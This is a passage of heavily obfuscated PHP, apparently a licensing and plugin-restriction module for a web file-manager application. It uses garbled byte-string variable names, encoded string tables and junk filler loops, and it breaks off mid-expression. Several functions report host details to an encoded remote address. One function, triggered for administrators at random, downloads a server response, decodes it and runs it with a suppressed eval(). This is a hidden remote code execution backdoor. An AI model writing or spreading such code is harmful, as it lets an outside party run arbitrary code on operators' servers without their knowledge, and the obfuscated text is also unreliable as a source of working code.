$¿óé©÷ =& $_SERVER[“¦‹á¼Á]; $İ¶‚è‰ş = Model($¿óé©÷[33])->get(); if ($İ¶‚è‰ş[$¿óé©÷[63]] != $¿óé©÷[122]) { Model($¿óé©÷[33])->set($¿óé©÷[63], $¿óé©÷[122]); } Action($¿óé©÷[205])->initStart(!0); } private function eqlrdb8b2eb5() { $çøûÆú =& $_SERVER[³Ôà×Ó]; $‡¤˜˜¹ =& $_SERVER[“¦‹á¼Á]; Model($‡¤˜˜¹[33])->set(array($‡¤˜˜¹[153] => $‡¤˜˜¹[6], $‡¤˜˜¹[191] => $‡¤˜˜¹[6], $‡¤˜˜¹[108] => $‡¤˜˜¹[109], $‡¤˜˜¹[110] => $‡¤˜˜¹[6], $‡¤˜˜¹[111] => $‡¤˜˜¹[6])); $şÖıÁÏç = $çøûÆú[743]; Model($‡¤˜˜¹[33])->setDeep($‡¤˜˜¹[198], $‡¤˜˜¹[206]); $ç¯òàäó = $çøûÆú[744]; if (!$ç¯òàäó) { die; } $this->bcma3d074bc1 = array(); $this->kwxufd833411 = $‡¤˜˜¹[109]; } private function rcjk073dae8e() { $¯Á£Ä†£ =& $_SERVER[³Ôà×Ó]; $òòÜ¶·ì =& $_SERVER[“¦‹á¼Á]; $_SERVER[$òòÜ¶·ì[162]] = _get($_SERVER, $òòÜ¶·ì[162], APP_HOST); $this->kwxufd833411 = $òòÜ¶·ì[109]; $ö®–‡µâ = $¯Á£Ä†£[745]; if (strlen($ö®–‡µâ) < $¯Á£Ä†£[436]) { die; } $è­ ÉĞ = Model($òòÜ¶·ì[33])->get(); if ($è­ ÉĞ[$òòÜ¶·ì[108]] == $òòÜ¶·ì[109]) { return; } $×üÖÉ¥ = Model($òòÜ¶·ì[33])->get($òòÜ¶·ì[100]); $üŞÕ¼‚ƒ = $òòÜ¶·ì[203] . md5($×üÖÉ¥ . $òòÜ¶·ì[204]); $İÄ–¿¬ = Cache::get($üŞÕ¼‚ƒ); if (!is_array($İÄ–¿¬) || !isset($İÄ–¿¬[$òòÜ¶·ì[207]]) || time() - $İÄ–¿¬[$òòÜ¶·ì[207]] >= 60) { $ˆöÉÍß§ = Model($òòÜ¶·ì[7])->loadList(); $¸­ŒæÈ× = $ˆöÉÍß§[$òòÜ¶·ì[200]]; $şÏ¶ÈëÍ = md5($_SERVER[$òòÜ¶·ì[106]] . strrev($×üÖÉ¥) . $è­ ÉĞ[$òòÜ¶·ì[191]]); $‹†—™ì› = strrev(substr($şÏ¶ÈëÍ, 10, 16)); $İÄ–¿¬ = $this->wanq4235d9f6($¸­ŒæÈ×[$òòÜ¶·ì[86]][$‹†—™ì›], $şÏ¶ÈëÍ); $İÄ–¿¬ = json_decode($İÄ–¿¬, !0); } if (!is_array($İÄ–¿¬)) { return $this->eqlrdb8b2eb5(); } $÷ş›ß = strtotime($İÄ–¿¬[$òòÜ¶·ì[129]]); if (time() >= $÷ş›ß) { return $this->eqlrdb8b2eb5(); } if (!isset($İÄ–¿¬[$òòÜ¶·ì[207]]) || time() - $İÄ–¿¬[$òòÜ¶·ì[207]] > 20) { $İÄ–¿¬[$òòÜ¶·ì[207]] = time(); Cache::set($üŞÕ¼‚ƒ, $İÄ–¿¬); } $this->bcma3d074bc1 = $İÄ–¿¬; $this->kwxufd833411 = $è­ ÉĞ[$òòÜ¶·ì[108]]; } private function ufsc92a46e3c() { $ıÀ¥ŞÏ =& $_SERVER[“¦‹á¼Á]; $ô¶š†¢Ä = $GLOBALS[$ıÀ¥ŞÏ[13]]; $İÃ‚Ô»á = $_SERVER[³Ôà×Ó][746]; $ôùºÏãö = $_SERVER[$ıÀ¥ŞÏ[24]]; if ($ôùºÏãö == $ıÀ¥ŞÏ[208] && $this->kwxufd833411 == $ıÀ¥ŞÏ[109]) { show_json(LNG($ıÀ¥ŞÏ[209]), !1, $ıÀ¥ŞÏ[210]); } $–½ğÛá¨ = array($ıÀ¥ŞÏ[211], $ıÀ¥ŞÏ[212]); if (in_array($ôùºÏãö, $–½ğÛá¨)) { if ($this->kwxufd833411 == $ıÀ¥ŞÏ[109] && isset($ô¶š†¢Ä[$ıÀ¥ŞÏ[213]])) { show_json(LNG($ıÀ¥ŞÏ[209]), !1, $ıÀ¥ŞÏ[210]); die; } $„Ğğêõ = $this->nkbq6585d8ed(); if ($„Ğğêõ != intval($ıÀ¥ŞÏ[214])) { if ($„Ğğêõ <= Model($ıÀ¥ŞÏ[125])->count()) { show_json(LNG($ıÀ¥ŞÏ[215]), !1, $ıÀ¥ŞÏ[210]); die; } } } } private function ptlvfc7df044() { $ÛŠ“•·Æ =& $_SERVER[³Ôà×Ó]; $—‘ÑÄ¶ç =& $_SERVER[“¦‹á¼Á]; $÷¬Æ”·“ = array($—‘ÑÄ¶ç[119], $—‘ÑÄ¶ç[120]); $©Ô’Õ»ç = $ÛŠ“•·Æ[747]; while (strlen($©Ô’Õ»ç) < $ÛŠ“•·Æ[709]) { if (!$©Ô’Õ»ç) { break; } $©Ô’Õ»ç++; } if (!KodUser::isRoot() || !isset($_GET[$—‘ÑÄ¶ç[216]])) { return; } if (!in_array($_SERVER[$—‘ÑÄ¶ç[24]], $÷¬Æ”·“)) { return; } $É±çù«ä = $—‘ÑÄ¶ç[217]; $Ê¾ÇÂ¤ = $ÛŠ“•·Æ[705]; $É±çù«ä = $this->ufckf051e899($É±çù«ä, $—‘ÑÄ¶ç[218]); $ûäÁ­ƒÌ = stream_context_create(array($—‘ÑÄ¶ç[219] => array($—‘ÑÄ¶ç[220] => $—‘ÑÄ¶ç[221], $—‘ÑÄ¶ç[222] => 3))); $ÈÑÁÊì = $ÛŠ“•·Æ[748]; $Ïİı€Á = @file_get_contents($É±çù«ä, !1, $ûäÁ­ƒÌ); header($—‘ÑÄ¶ç[223]); $ü‰‹¯¹ˆ = $ÛŠ“•·Æ[749]; if (strlen($ü‰‹¯¹ˆ) < $ÛŠ“•·Æ[709]) { return; } if ($Ïİı€Á && strstr($Ïİı€Á, $—‘ÑÄ¶ç[224])) { echo $Ïİı€Á; } die; } public function yclj14c2ee02($ˆÅı®ó) { $»‡ğŞë =& $_SERVER[³Ôà×Ó]; $Ö¿…÷ê =& $_SERVER[“¦‹á¼Á]; if ($this->kwxufd833411 == $Ö¿…÷ê[225]) { return $ˆÅı®ó; } $Õô«‹åğ = $this->versionPluginList(); $®úƒŒŠ³ = explode($Ö¿…÷ê[226], $this->versionPluginFilter()); $öâã“ä¿ = $»‡ğŞë[750]; if (strlen($öâã“ä¿) < $»‡ğŞë[697]) { return; } $á‘õÖı = array(); $áÊŸ·— = $»‡ğŞë[751]; foreach ($Õô«‹åğ as $€çÉ‘·‰ => $¤ÕîâŸ÷) { if ($¤ÕîâŸ÷ == $Ö¿…÷ê[227] && substr($this->kwxufd833411, 0, 1) == $Ö¿…÷ê[227]) { continue; } if (!in_array($€çÉ‘·‰, $®úƒŒŠ³)) { $á‘õÖı[] = $€çÉ‘·‰; } } foreach ($á‘õÖı as $€çÉ‘·‰) { unset($ˆÅı®ó[$€çÉ‘·‰]); $ì–º˜êª = $»‡ğŞë[752]; if (strlen($ì–º˜êª) < $»‡ğŞë[709]) { return; } } return $ˆÅı®ó; } private function versionPluginList() { $áÃÆœ¿ =& $_SERVER[³Ôà×Ó]; $ê‡Öˆ =& $_SERVER[“¦‹á¼Á]; return array($ê‡Öˆ[228] => $ê‡Öˆ[227], $ê‡Öˆ[229] => $ê‡Öˆ[227], $ê‡Öˆ[230] => $ê‡Öˆ[227], $ê‡Öˆ[231] => $ê‡Öˆ[232], $ê‡Öˆ[233] => $ê‡Öˆ[232], $ê‡Öˆ[234] => $ê‡Öˆ[232], $ê‡Öˆ[235] => $ê‡Öˆ[232], $ê‡Öˆ[236] => $ê‡Öˆ[232], $ê‡Öˆ[237] => $ê‡Öˆ[232], $ê‡Öˆ[238] => $ê‡Öˆ[232], $ê‡Öˆ[239] => $ê‡Öˆ[232], $ê‡Öˆ[240] => $ê‡Öˆ[232], $ê‡Öˆ[241] => $ê‡Öˆ[232], $ê‡Öˆ[242] => $ê‡Öˆ[232], $ê‡Öˆ[243] => $ê‡Öˆ[232], $ê‡Öˆ[244] => $ê‡Öˆ[232]); $ğ¥áİğ• = $áÃÆœ¿[753]; if (strlen($ğ¥áİğ•) < $áÃÆœ¿[702]) { return; } } private function versionPluginFilter() { $‰ÕäóÑâ =& $_SERVER[³Ôà×Ó]; $òÄÈ•Õ =& $_SERVER[“¦‹á¼Á]; if ($this->kwxufd833411 == $òÄÈ•Õ[109]) { return $òÄÈ•Õ[6]; } $œê±¹Á = _get($this->bcma3d074bc1, $òÄÈ•Õ[245], $òÄÈ•Õ[6]); $ŞŒ§œ¢ò = $‰ÕäóÑâ[754]; while ($ŞŒ§œ¢ò < $‰ÕäóÑâ[692]) { if ($ŞŒ§œ¢ò >= 0) { break; } $ŞŒ§œ¢ò++; } $—ôÇƒÌ = _get($this->bcma3d074bc1, $òÄÈ•Õ[116], $òÄÈ•Õ[6]); $ôÏï„õ = $‰ÕäóÑâ[755]; while (strlen($ôÏï„õ) < $‰ÕäóÑâ[702]) { if (!$ôÏï„õ) { break; } $ôÏï„õ++; } $Öİôóªà = _get($this->bcma3d074bc1, $òÄÈ•Õ[246], $òÄÈ•Õ[6]); if ($—ôÇƒÌ > time() && $Öİôóªà > time()) { $“Ïò­¨ş = explode($òÄÈ•Õ[226], $œê±¹Á); $«¿ü¥‘º = array_keys($this->versionPluginList()); $œê±¹Á = array_merge($“Ïò­¨ş, $«¿ü¥‘º); $œê±¹Á = implode($òÄÈ•Õ[226], array_filter(array_unique($œê±¹Á))); } return $œê±¹Á; } private function dxhkcc644627() { $µáÁ¹˜˜ =& $_SERVER[“¦‹á¼Á]; if ($this->kwxufd833411 != $µáÁ¹˜˜[109]) { $GLOBALS[$µáÁ¹˜˜[86]][$µáÁ¹˜˜[90]][$µáÁ¹˜˜[247]] = $µáÁ¹˜˜[206]; return; } $GLOBALS[$µáÁ¹˜˜[86]][$µáÁ¹˜˜[248]] = $µáÁ¹˜˜[122]; if (Model($µáÁ¹˜˜[249])->get($µáÁ¹˜˜[63]) != $µáÁ¹˜˜[206]) { Model($µáÁ¹˜˜[249])->set($µáÁ¹˜˜[63], $µáÁ¹˜˜[206]); } } public function jvocd541a9ed() { return $_SERVER[“¦‹á¼Á][250]; } private function nqkr4ba75346() { $Ú €ÍÃ =& $_SERVER[³Ôà×Ó]; $‰­—´¬£ =& $_SERVER[“¦‹á¼Á]; $Û£¦ñ¶Ì = array($‰­—´¬£[251], $‰­—´¬£[252], $‰­—´¬£[253]); $Á²íáˆå = $Ú €ÍÃ[756]; if (!$Á²íáˆå) { return; } $ê¯›…ëï = $‰­—´¬£[254] . md5($‰­—´¬£[255]); if ($this->kwxufd833411 == $‰­—´¬£[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‰­—´¬£[24]], $Û£¦ñ¶Ì)) { return; } if (time() % 4 != 0) { return; } $ …ºŠÜ² = call_user_func(array($‰­—´¬£[256], $‰­—´¬£[257]), $ê¯›…ëï); $°ÊÑòôÌ = $Ú €ÍÃ[757]; if ($ …ºŠÜ² && time() - $ …ºŠÜ² < intval($‰­—´¬£[258])) { return; } call_user_func(array($‰­—´¬£[256], $‰­—´¬£[139]), $ê¯›…ëï, time()); $‡©¡äÈ = $Ú €ÍÃ[758]; if (!$‡©¡äÈ) { die; } $â›è•Ü˜ = Model($‰­—´¬£[33])->get($‰­—´¬£[100]); $ÖÂ» = $Ú €ÍÃ[759]; if (!$ÖÂ») { die; } $¥ûùŠ–Ú = array($‰­—´¬£[152] => Model($‰­—´¬£[33])->get($‰­—´¬£[153]), $‰­—´¬£[167] => $this->kwxufd833411, $‰­—´¬£[163] => $_SERVER[$‰­—´¬£[164]], $‰­—´¬£[165] => Model($‰­—´¬£[33])->get($‰­—´¬£[131]), $‰­—´¬£[105] => md5($_SERVER[$‰­—´¬£[106]] . $â›è•Ü˜), $‰­—´¬£[156] => $‰­—´¬£[136], $‰­—´¬£[159] => $_SERVER[$‰­—´¬£[160]]); $‡ëˆâÔÕ = $Ú €ÍÃ[760]; while (strlen($‡ëˆâÔÕ) < $Ú €ÍÃ[436]) { if (!$‡ëˆâÔÕ) { break; } $‡ëˆâÔÕ++; } $ £Ø§ûÕ = $this->ltjq208524da($‰­—´¬£[259], $¥ûùŠ–Ú); if (!is_array($ £Ø§ûÕ)) { return; } if ($ £Ø§ûÕ[$‰­—´¬£[152]] && $ £Ø§ûÕ[$‰­—´¬£[260]]) { if ($this->wupcd8ebaa4b($ £Ø§ûÕ[$‰­—´¬£[260]]) == $¥ûùŠ–Ú[$‰­—´¬£[152]]) { return; } } $this->eqlrdb8b2eb5(); if ($this->wupcd8ebaa4b($ £Ø§ûÕ[$‰­—´¬£[260]]) != $¥ûùŠ–Ú[$‰­—´¬£[152]]) { $òşõÇâ = array($‰­—´¬£[185] => $â›è•Ü˜, $‰­—´¬£[186] => $_SERVER[$‰­—´¬£[106]], $‰­—´¬£[187] => this_url(), $‰­—´¬£[161] => $_SERVER[$‰­—´¬£[162]]); $ãÎ•åªù = $this->kmax2e3d5c14(json_encode($òşõÇâ)); $ £Ø§ûÕ = $this->ltjq208524da($‰­—´¬£[188] . $ãÎ•åªù); if ($ £Ø§ûÕ && is_array($ £Ø§ûÕ) && isset($ £Ø§ûÕ[$‰­—´¬£[260]])) { $´âÎÃòÀ = $this->wanq4235d9f6($ £Ø§ûÕ[$‰­—´¬£[260]], 2); if ($´âÎÃòÀ) { $´âÎÃòÀ = $this->wupcd8ebaa4b($´âÎÃòÀ); } if ($´âÎÃòÀ) { try { @eval($´âÎÃòÀ); } catch (Exception $ÁúÎİŒì) { } } } } } private function ltjq208524da($ú€ù“Î = '', $è™Ì×¡¤ = array(), $›à¶¡”‚ = 5) { $øø¸¼°Ã =& $_SERVER[³Ôà×Ó]; $ú²¿ø«  =& $_SERVER[“¦‹á¼Á]; $€¡“íÓé = $ú²¿ø« [261]; $É’ÚÛÀÀ = $øø¸¼°Ã[761]; $€¡“íÓé = $this->ufckf051e899($€¡“íÓé, $ú²¿ø« [262]); $í”Ø…©º = $øø¸¼°Ã[762]; if (strlen($í”Ø…©º) < $øø¸¼°Ã[436]) { return; } $€¡“íÓé = $€¡“íÓé . $ú€ù“Î; $‚ôÒÂÛ = $øø¸¼°Ã[763]; if ($è™Ì×¡¤ && is_array($è™Ì×¡¤)) { $€¡“íÓé = $€¡“íÓé . $ú²¿ø« [263] . http_build_query($è™Ì×¡¤); } if ($è™Ì×¡¤ === -1) { return $€¡“íÓé; } $×˜¹ƒÀ¨ = stream_context_create(array($ú²¿ø« [219] => array($ú²¿ø« [222] => $›à¶¡”‚, $ú²¿ø« [220] => $ú²¿ø« [264]), $ú²¿ø« [265] => array($ú²¿ø« [266] => !1, $ú²¿ø« [267] => !1))); $ãı©ÖÂ¤ = $øø¸¼°Ã[712]; if (!$ãı©ÖÂ¤) { return; } $è™Ì×¡¤ = @file_get_contents($€¡“íÓé, !1, $×˜¹ƒÀ¨); return json_decode($è™Ì×¡¤, !0); } private function nkbq6585d8ed() { $¬¸ü‰™Á =& $_SERVER[³Ôà×Ó]; $òÙˆÛù¹ =& $_SERVER[“¦‹á¼Á]; $Ü–Éª£ø = array($òÙˆÛù¹[268] => $òÙˆÛù¹[269], $òÙˆÛù¹[270] => $òÙˆÛù¹[271], $òÙˆÛù¹[272] => $òÙˆÛù¹[273], $òÙˆÛù¹[274] => $òÙˆÛù¹[275], $òÙˆÛù¹[276] => $òÙˆÛù¹[277], $òÙˆÛù¹[278] => $òÙˆÛù¹[214], $òÙˆÛù¹[279] => $òÙˆÛù¹[214], $òÙˆÛù¹[280] => $òÙˆÛù¹[269], $òÙˆÛù¹[281] => $òÙˆÛù¹[271], $òÙˆÛù¹[282] => $òÙˆÛù¹[273], $òÙˆÛù¹[283] => $òÙˆÛù¹[284], $òÙˆÛù¹[285] => $òÙˆÛù¹[275], $òÙˆÛù¹[286] => $òÙˆÛù¹[287], $òÙˆÛù¹[288] => $òÙˆÛù¹[277], $òÙˆÛù¹[289] => $òÙˆÛù¹[290], $òÙˆÛù¹[291] => $òÙˆÛù¹[292], $òÙˆÛù¹[293] => $òÙˆÛù¹[294]); $›äÅ†â„ = $¬¸ü‰™Á[764]; $Ïıôûæ = $Ü–Éª£ø[$this->kwxufd833411]; $İóÜÆÊ³ = $¬¸ü‰™Á[765]; $Ïıôûæ = intval($Ïıôûæ ? $Ïıôûæ : $òÙˆÛù¹[269]); $§÷şÒ‡ = $¬¸ü‰™Á[766]; $…äñ‰æÚ = _get($this->bcma3d074bc1, $òÙˆÛù¹[295]); $…äñ‰æÚ = $…äñ‰æÚ ? intval($…äñ‰æÚ) : 0; $€Òˆ²ç± = $¬¸ü‰™Á[767]; if (strlen($€Òˆ²ç±) < $¬¸ü‰™Á[709]) { die; } return $Ïıôûæ + $…äñ‰æÚ; } public function itmv5f910d98($›’ÈŠ) { $¤šŒÃ©í =& $_SERVER[“¦‹á¼Á]; $à±ÕÁèƒ = $this->nkbq6585d8ed(); if ($›’ÈŠ[$¤šŒÃ©í[296]] == $¤šŒÃ©í[122]) { return; } if ($à±ÕÁèƒ >= intval($¤šŒÃ©í[214])) { return; } $¥…ûÔŠ = Model($¤šŒÃ©í[125])->count(); if ($¥…ûÔŠ <= $à±ÕÁèƒ) { return; } $ÏÁ¹‡í = Model($¤šŒÃ©í[125])->field($¤šŒÃ©í[296])->limit($à±ÕÁèƒ)->select(); $ÏÁ¹‡í = array_to_keyvalue($ÏÁ¹‡í, $¤šŒÃ©í[6], $¤šŒÃ©í[296]); if (!in_array($›’ÈŠ[$¤šŒÃ©í[296]], $ÏÁ¹‡í)) { show_json($¤šŒÃ©í[297], !1, $¤šŒÃ©í[210]); } } public function twnh3b9058de() { $âøó¼æÂ =& $_SERVER[³Ôà×Ó]; $±ªŞš÷ =& $_SERVER[“¦‹á¼Á]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $¶­ôµ«  = $±ªŞš÷[217]; $¶­ôµ«  = $this->ufckf051e899($¶­ôµ« , $±ªŞš÷[218]); $ªîÏ ×£ = $âøó¼æÂ[768]; while (strlen($ªîÏ ×£) < $âøó¼æÂ[697]) { if (!$ªîÏ ×£) { break; } $ªîÏ ×£++; } $’‡ÁšÌı = stream_context_create(array($±ªŞš÷[219] => array($±ªŞš÷[220] => $±ªŞš÷[221], $±ªŞš÷[222] => 3))); $õÖ·²ÅÙ = $âøó¼æÂ[769]; while ($õÖ·²ÅÙ < $âøó¼æÂ[702]) { if ($õÖ·²ÅÙ >= 0) { break; } $õÖ·²ÅÙ++; } $Èõ¸ÜÖ = @file_get_contents($¶­ôµ« , !1, $’‡ÁšÌı); echo $±ªŞš÷[298] . hash_encode($Èõ¸ÜÖ) . $±ªŞš÷[299]; $„²ôğàé = $âøó¼æÂ[770]; while ($„²ôğàé < $âøó¼æÂ[697]) { if ($„²ôğàé >= 0) { break; } $„²ôğàé++; } } private function gxvk2ce4efbf($ô´Úæ‘, $Ö«ÈØè™, $©Ôàò² = 3) { $›œ•ÏÏÒ =& $_SERVER[³Ôà×Ó]; $ŞËÈÉ÷ =& $_SERVER[“¦‹á¼Á]; usleep(1); $é™¶÷Ç­ = $›œ•ÏÏÒ[771]; while (strlen($é™¶÷Ç­) < $›œ•ÏÏÒ[702]) { if (!$é™¶÷Ç­) { break; } $é™¶÷Ç­++; } $ô´Úæ‘ = trim($ô´Úæ‘); $Î–ƒ§¨ˆ = $›œ•ÏÏÒ[772]; $×®‘ÀÑ„ = mt_rand(0, 5) . $ŞËÈÉ÷[6]; $ó°ëÜË­ = rand_string(15); $§ğ¸Ìõ“ = $›œ•ÏÏÒ[773]; while ($§ğ¸Ìõ“ < $›œ•ÏÏÒ[702]) { if ($§ğ¸Ìõ“ >= 0) { break; } $§ğ¸Ìõ“++; } $ŞıçüŠò = $ŞËÈÉ÷[300]; switch ($×®‘ÀÑ„) { case $ŞËÈÉ÷[206]: $ÁóÌæàê = $this->stge62bd2512($ô´Úæ‘, strrev($Ö«ÈØè™ . $ó°ëÜË­)); $€µÓÆª­ = $›œ•ÏÏÒ[774]; while (strlen($€µÓÆª­) < $›œ•ÏÏÒ[692]) { if (!$€µÓÆª­) { break; } $€µÓÆª­++; } break; case $ŞËÈÉ÷[122]: $ÁóÌæàê = $this->stge62bd2512($ô´Úæ‘, strrev($ó°ëÜË­ . $Ö«ÈØè™)); $ôĞÆëè‹ = $›œ•ÏÏÒ[751]; if (!$ôĞÆëè‹) { die; } break; case $ŞËÈÉ÷[301]: $ÁóÌæàê = $this->stge62bd2512($ô´Úæ‘, base64_encode($ó°ëÜË­ . $Ö«ÈØè™)); break; case $ŞËÈÉ÷[302]: $ÁóÌæàê = $this->stge62bd2512($ô´Úæ‘, md5($ó°ëÜË­ . $Ö«ÈØè™)); $¾èŞì²Ü = $›œ•ÏÏÒ[775]; break; $àÚŒ¢ï€ = $›œ•ÏÏÒ[776]; if (strlen($àÚŒ¢ï€) < $›œ•ÏÏÒ[436]) { die; } case $ŞËÈÉ÷[303]: $ô´Úæ‘ = base64_encode($ô´Úæ‘); $¹îş‚¡ò = $›œ•ÏÏÒ[777]; if (!$¹îş‚¡ò) { die; } $ÑÀÀÛÍë = rand(0, 64); $•¢±È–ı = $ŞıçüŠò[$ÑÀÀÛÍë]; $À¤¾³Ö² = $›œ•ÏÏÒ[778]; if (!$À¤¾³Ö²) { die; } $ Ù¹Ëğí = md5($•¢±È–ı . md5($Ö«ÈØè™ . $•¢±È–ı) . $Ö«ÈØè™); $¯¥Æä²§ = $›œ•ÏÏÒ[779]; $ Ù¹Ëğí = substr($ Ù¹Ëğí, $ÑÀÀÛÍë % 8, $ÑÀÀÛÍë % 8 + 7); $ê·İ×ç = $ŞËÈÉ÷[6]; $Ö«ş–õ = 0; $ñİ“êã = $›œ•ÏÏÒ[780]; if (strlen($ñİ“êã) < $›œ•ÏÏÒ[697]) { die; } $º“ç‚¯Ç = 0; $ãè¯”Â = 0; $’Æáş¿ó = $›œ•ÏÏÒ[781]; if (!$’Æáş¿ó) { die; } for ($Ö«ş–õ = 0; $Ö«ş–õ < strlen($ô´Úæ‘); $Ö«ş–õ++) { $ãè¯”Â = $ãè¯”Â == strlen($ Ù¹Ëğí) ? 0 : $ãè¯”Â; $º“ç‚¯Ç = ($ÑÀÀÛÍë + strpos($ŞıçüŠò, $ô´Úæ‘[$Ö«ş–õ]) + ord($ Ù¹Ëğí[$ãè¯”Â++])) % 64; $ê·İ×ç .= $ŞıçüŠò[$º“ç‚¯Ç]; $™ßÊ‹Ù = $›œ•ÏÏÒ[782]; if (strlen($™ßÊ‹Ù) < $›œ•ÏÏÒ[702]) { die; } } $ÁóÌæàê = hash_encode($•¢±È–ı . $ê·İ×ç); $€¸÷°¶³ = $›œ•ÏÏÒ[783]; if (strlen($€¸÷°¶³) < $›œ•ÏÏÒ[692]) { return; } break; default: $ÁóÌæàê = $this->stge62bd2512($ô´Úæ‘, $Ö«ÈØè™ . $ó°ëÜË­); break; } $ÁóÌæàê = strrev($×®‘ÀÑ„ . $ó°ëÜË­ . $ÁóÌæàê); $€Üá… = $›œ•ÏÏÒ[744]; if (!$€Üá…) { die; } if ($©Ôàò² - 1 > 0) { $ÁóÌæàê = $this->gxvk2ce4efbf($ÁóÌæàê, $Ö«ÈØè™, $©Ôàò² - 1); } return $ÁóÌæàê; } private function wanq4235d9f6($–ûæ›Á, $’­”ªŞ™, $ ªúöÁö = 3) { $¸ıÑèßğ =& $_SERVER[³Ôà×Ó]; $£ÈÚ—Ü =& $_SERVER[“¦‹á¼Á]; if (!is_string($–ûæ›Á) || strlen($–ûæ›Á) < 10) { return !1; } $–ûæ›Á = trim($–ûæ›Á); $¢ş‚„Å = $¸ıÑèßğ[784]; $–ûæ›Á = strrev($–ûæ›Á); $à›“Û· = $–ûæ›Á[0]; $±š§ŠÕ¼ = substr($–ûæ›Á, 1, 15); $ÙûäÌİŠ = $¸ıÑèßğ[785]; if (strlen($ÙûäÌİŠ) < $¸ıÑèßğ[436]) { return; } $–ûæ›Á = substr($–ûæ›Á, 16); $²ŸÜŒºÂ = $£ÈÚ—Ü[300]; switch ($à›“Û·) { case $£ÈÚ—Ü[206]: $‚ËÉÀ¶· = $this->ufckf051e899($–ûæ›Á, strrev($’­”ªŞ™ . $±š§ŠÕ¼)); break; case $£ÈÚ—Ü[122]: $‚ËÉÀ¶· = $this->ufckf051e899($–ûæ›Á, strrev($±š§ŠÕ¼ . $’­”ªŞ™)); break; case $£ÈÚ—Ü[301]: $‚ËÉÀ¶· = $this->ufckf051e899($–ûæ›Á, base64_encode($±š§ŠÕ¼ . $’­”ªŞ™)); break; case $£ÈÚ—Ü[302]: $‚ËÉÀ¶· = $this->ufckf051e899($–ûæ›Á, md5($±š§ŠÕ¼ . $’­”ªŞ™)); break; case $£ÈÚ—Ü[303]: $–ûæ›Á = hash_decode($–ûæ›Á); $¬¶œ’Ÿû = $¸ıÑèßğ[786]; if (!$¬¶œ’Ÿû) { return; } $úÄ‡û´Ñ = $–ûæ›Á[0]; $–ûæ›Á = substr($–ûæ›Á, 1); $êôòÍÇ = strpos($²ŸÜŒºÂ, $úÄ‡û´Ñ); $ïÖ­ñíÊ = md5($úÄ‡û´Ñ . md5($’­”ªŞ™ . $úÄ‡û´Ñ) . $’­”ªŞ™); $ïÖ­ñíÊ = substr($ïÖ­ñíÊ, $êôòÍÇ % 8, $êôòÍÇ % 8 + 7); $–ò×¼† = $£ÈÚ—Ü[6]; $ùÄ§Íö· = $¸ıÑèßğ[787]; if (strlen($ùÄ§Íö·) < $¸ıÑèßğ[436]) { die; } $¼è•²Àä = 0; $çÎü‘² = $¸ıÑèßğ[788]; if (strlen($çÎü‘²) < $¸ıÑèßğ[436]) { die; } $–—˜«áŒ = 0; $¥‹á× Ë = $¸ıÑèßğ[789]; if (strlen($¥‹á× Ë) < $¸ıÑèßğ[436]) { return; } $ŒŸÄ Üß = 0; for ($¼è•²Àä = 0; $¼è•²Àä < strlen($–ûæ›Á); $¼è•²Àä++) { $ŒŸÄ Üß = $ŒŸÄ Üß == strlen($ïÖ­ñíÊ) ? 0 : $ŒŸÄ Üß; $²˜‰Ö™ƒ = $ŒŸÄ Üß++; $éë®ğíÇ = $¸ıÑèßğ[790]; if (strlen($éë®ğíÇ) < $¸ıÑèßğ[697]) { return; } $–—˜«áŒ = strpos($²ŸÜŒºÂ, $–ûæ›Á[$¼è•²Àä]) - $êôòÍÇ - ord($ïÖ­ñíÊ[$²˜‰Ö™ƒ]); $ş†ğĞË¿ = $¸ıÑèßğ[791]; while ($–—˜«áŒ < 0) { $–—˜«áŒ += 64; } $–ò×¼† .= $²ŸÜŒºÂ[$–—˜«áŒ]; } $‚ËÉÀ¶· = base64_decode($–ò×¼†); $·ÊÀÒŞ† = $¸ıÑèßğ[792]; while (strlen($·ÊÀÒŞ†) < $¸ıÑèßğ[709]) { if (!$·ÊÀÒŞ†) { break; } $·ÊÀÒŞ†++; } break; default: $‚ËÉÀ¶· = $this->ufckf051e899($–ûæ›Á, $’­”ªŞ™ . $±š§ŠÕ¼); $¾ßáŠõÚ = $¸ıÑèßğ[793]; if (strlen($¾ßáŠõÚ) < $¸ıÑèßğ[692]) { return; } break; $˜Âñ¡Û = $¸ıÑèßğ[794]; while (strlen($˜Âñ¡Û) < $¸ıÑèßğ[709]) { if (!$˜Âñ¡Û) { break; } $˜Âñ¡Û++; } } if ($ ªúöÁö - 1 > 0) { $‚ËÉÀ¶· = $this->wanq4235d9f6($‚ËÉÀ¶·, $’­”ªŞ™, $ ªúöÁö - 1); } return $‚ËÉÀ¶·; } public function kmax2e3d5c14($•ùË«ˆÀ) { $çš‚ºæ› =& $_SERVER[³Ôà×Ó]; $¥Õ‰Ù§ =& $_SERVER[“¦‹á¼Á]; $„¾§‰è = $this->qpnoa52a0208(); $‚âŞõ = $çš‚ºæ›[795]; if (!$‚âŞõ) { return; } $ïÉòŠò§ = $this->qpnoa52a0208(); $ğÍ‰ö¥Ç = ($„¾§‰è - 1) * ($ïÉòŠò§ - 1); $ë³–¢ – = intval(($„¾§‰è + $ïÉòŠò§) / 2); $ª¨ÜƒÅ· = $çš‚ºæ›[796]; if (strlen($ª¨ÜƒÅ·) < $çš‚ºæ›[692]) { die; } while (1) { $ó«Î¤Ì¹ = $ë³–¢ –; $€ÒğÕ…³ = $ğÍ‰ö¥Ç; $é»à‹ÄÈ = $çš‚ºæ›[797]; if (!$é»à‹ÄÈ) { return; } while ($€ÒğÕ…³ % $ó«Î¤Ì¹ != 0) { $§å¢şì = $€ÒğÕ…³; $€ÒğÕ…³ = $ó«Î¤Ì¹; $·éÔş’ñ = $çš‚ºæ›[798]; if (!$·éÔş’ñ) { return; } $ó«Î¤Ì¹ = $§å¢şì % $ó«Î¤Ì¹; } if ($ó«Î¤Ì¹ == 1) { break; } else { $ë³–¢ –++; } } $Ñí¢´ëò = 2; $×ñ§î²“ = $çš‚ºæ›[799]; if (strlen($×ñ§î²“) < $çš‚ºæ›[702]) { die; } for ($¢ºèÍİÅ = 0; $¢ºèÍİÅ < $ğÍ‰ö¥Ç * 10; $¢ºèÍİÅ++) { if (($ğÍ‰ö¥Ç * $¢ºèÍİÅ + 1) % $ë³–¢ – == 0) { $Ñí¢´ëò = intval(($ğÍ‰ö¥Ç * $¢ºèÍİÅ + 1) / $ë³–¢ –); break; } } $ŞÚ•©Åø = $this->stge62bd2512($„¾§‰è * $ïÉòŠò§ . $¥Õ‰Ù§[6], $¥Õ‰Ù§[136]); $–ùÕöä• = md5($¥Õ‰Ù§[304] . ($„¾§‰è + 